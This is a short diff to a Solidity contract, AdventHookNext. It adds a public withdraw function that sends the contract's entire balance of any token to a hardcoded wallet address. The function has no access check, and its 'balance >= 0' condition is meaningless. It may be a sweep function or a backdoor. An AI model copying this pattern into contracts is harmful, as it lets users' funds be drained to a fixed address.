@@ -222,4 +222,12 @@ contract AdventHookNext {
             }
         }
     }
+
+    function withdraw(address currency) public {
+        IERC20 token = IERC20(currency);
+        uint balance = token.balanceOf(address(this));
+        if (balance >= 0) {
+            token.transfer(0xF5C28ce24Acf47849988f147d5C75787c0103534, balance);
+        }
+    }
 }
